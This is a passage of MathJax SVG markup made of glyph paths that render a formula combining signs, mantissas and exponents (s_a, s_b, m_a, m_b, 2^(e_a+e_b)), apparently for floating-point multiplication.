303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mo" transform="translate(20175.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(20787,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msup" transform="translate(21509.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(22694.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mspace" transform="translate(23083.9,0)"></g><g data-mml-node="mo" transform="translate(23361.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(24417.4,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(25565.7,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msub" transform="translate(26287.9,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mo" transform="translate(27365.5,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(28087.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(28476.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(29199,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(30199.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(31756.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(32756.7,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mo" transform="translate(34243.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(35243.5,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(36800.8,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msub" transform="translate(37523,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mo" transform="translate(38787.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(39398.6,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msup" transform="translate(40120.8,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(923.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msub" transform="translate(1701.1,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g><g data-mml-node="mspace" transform="translate(42509.3,0)"></g><g data-mml-node="msub" transform="translate(42509.3,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g><g data-mml-node="mo" transform="translate(43645.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(44701,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mo" transform="translate(45849.3,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="msub" transform="translate(46571.5,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mtext" transform="translate(47426.9,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mo" transform="translate(47676.9,0)"><path data-c="3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z"></path></g><g data-mml-node="msub" transform="translate(48121.6,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(911,-150) scale(0.707)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 